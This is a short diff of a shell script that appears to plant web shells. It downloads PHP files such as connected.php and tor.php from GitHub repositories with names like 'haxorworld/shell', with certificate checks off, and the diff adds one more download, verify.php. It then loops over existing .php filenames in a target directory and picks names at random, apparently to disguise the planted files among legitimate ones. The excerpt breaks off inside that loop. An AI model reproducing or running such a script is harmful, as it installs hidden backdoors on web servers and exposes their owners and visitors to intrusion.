@@ -15,6 +15,7 @@ wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/tor.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/ngir.php
 wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/haxorworld/shell/main/connected.php
+wget --no-verbose --no-check-certificate -qP x https://raw.githubusercontent.com/hime-yuki77/res/main/verify.php
 for i in $(ls -l x/ |awk '{print $9}'|sed '/^$/d')
 do
         myfile=$(find $varname -name "*.php" |rev |cut -d/ -f 1 |rev |shuf -n 1)
